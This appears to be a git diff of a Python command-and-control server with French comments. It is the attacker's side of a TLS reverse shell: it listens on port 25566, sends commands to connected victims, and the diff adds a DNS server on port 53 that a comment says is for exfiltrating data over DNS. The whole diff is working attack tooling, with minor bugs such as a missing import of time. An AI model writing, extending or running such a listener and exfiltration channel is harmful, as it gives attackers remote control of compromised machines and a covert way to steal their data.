@@ -4,13 +4,16 @@
 
 # import des libraires
 import socket       # communication entre l'attaque et la cible
-import ssl          # chiffrement des échanges
+import ssl
+import threading          # chiffrement des échanges
+from dns_server import *
 #import dns_server   # exfiltration des données via DNS
 
 # en écoute sur toutes les connexions entrantes
 # 0.0.0.0:25566
 HOST = '0.0.0.0'
 PORT = 25566
+DNS_PORT = 53
 CERTIFICATE = "./chiffrement/python_ssl.pem"
 KEY = "./chiffrement/python_ssl_priv.key"
 # taille des messages : 128kB max
@@ -28,7 +31,7 @@ context.load_cert_chain(certfile=CERTIFICATE, keyfile=KEY)
 
 #à mettre dans une fonction
 def shell(sock):
-    while sock:
+    while True:
         print(f"[*] Listening to {HOST}:{PORT}...")
         conn, addr = sock.accept()
 
@@ -48,10 +51,12 @@ def shell(sock):
                     conn.close()
                     exit(0)
                 connssl.sendall(command.encode())
-                reply = connssl.recv(BUFFER_SIZE)
-                if not reply:
-                    break
-                print(reply.decode())
+                time.sleep(1)
+                print("")
+                #reply = connssl.recv(BUFFER_SIZE)
+                #if not reply:
+                #    break
+                #print(reply.decode())
         except Exception:
             print(f"[-] Fatal error: killing session with {addr}")
             exit(-1)
@@ -60,4 +65,15 @@ def shell(sock):
             connssl.close()
             exit(0)
 
-shell(sock)
+if __name__ == "__main__":
+    thread_shell = threading.Thread(target=shell, args=[sock])
+    thread_shell.start()
+    #thread_shell.join()
+    #thread_dns = threading.Thread(target=dns_server, args=[DNS_PORT])
+    #thread_dns.start()
+    resolver = CustomResolver()
+    server = DNSServer(resolver, port=DNS_PORT, handler=CustomDNSHandler)
+
+    print(f"[*] Listening to {HOST}:{DNS_PORT}...")
+    server.start()
+    
